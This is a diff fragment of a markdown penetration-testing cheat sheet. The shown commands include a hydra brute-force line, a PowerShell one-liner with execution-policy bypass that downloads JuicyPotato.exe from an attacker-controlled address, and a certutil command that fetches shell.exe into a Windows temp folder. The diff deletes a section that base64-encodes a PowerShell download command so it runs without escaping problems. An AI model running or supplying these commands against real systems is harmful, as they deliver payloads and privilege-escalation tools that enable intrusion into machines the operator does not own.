@@ -112,14 +112,6 @@ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share
 powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')
 ```
 
-# Powershell File Transfer Encode Command for Transfer
-Very helpful for chars that need to be escaped otherwise.
-```bash
-$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
-$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
-powershell.exe -NoProfile -encoded $Encoded
-```
-
 # Certutil Download
 ```bash
 certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe
